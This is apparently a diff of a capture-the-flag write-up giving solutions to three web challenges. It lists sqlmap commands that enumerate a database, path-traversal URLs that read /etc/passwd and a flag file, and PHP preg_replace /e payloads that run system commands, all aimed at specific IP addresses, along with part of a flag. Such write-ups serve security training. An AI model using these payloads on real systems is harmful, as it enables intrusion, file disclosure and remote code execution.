@@ -4,30 +4,50 @@
 
 ### Small data leak
 
-```sqlmap -u http://35.198.183.125:30321/user?id=1;```
+```
+sqlmap -u http://35.198.183.125:30321/user?id=1;
+```
 
-```sqlmap -u http://35.198.183.125:30321/user?id=1 --dbs```
+```
+sqlmap -u http://35.198.183.125:30321/user?id=1 --dbs
+```
 
-```sqlmap -u http://35.198.183.125:30321/user?id=1 -D public --tables```
+```
+sqlmap -u http://35.198.183.125:30321/user?id=1 -D public --tables
+```
 
-```sqlmap -u http://35.198.183.125:30321/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns```
+```
+sqlmap -u http://35.198.183.125:30321/user?id=1 -D public -T 'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da' --columns
+```
 
 
 ### File Crawler
 
-```http://34.141.25.94:32191/local?image_name=..//..//..//etc/passwd```
+```
+http://34.141.25.94:32191/local?image_name=..//..//..//etc/passwd
+```
 
-```http://34.141.25.94:32191/local?image_name=..////tmp//flag```
+```
+http://34.141.25.94:32191/local?image_name=..////tmp//flag
+```
 
 
 ### Substitute
-```http://35.246.170.233:31993/?vector=/Admin/e&replace=phpinfo()```
+```
+http://35.246.170.233:31993/?vector=/Admin/e&replace=phpinfo()
+```
 
-```http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls -l")```
+```
+http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls -l")
+```
 
-```http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls here_we_dont_have_flag -l")```
+```
+http://35.246.170.233:31993/?vector=/Admin/e&replace=system("ls here_we_dont_have_flag -l")
+```
 
-```http://35.246.170.233:31993/?vector=/Admin/e&replace=system("cat here_we_dont_have_flag/flag.txt")```
+```
+http://35.246.170.233:31993/?vector=/Admin/e&replace=system("cat here_we_dont_have_flag/flag.txt")
+```
 
 
 ### manual-review
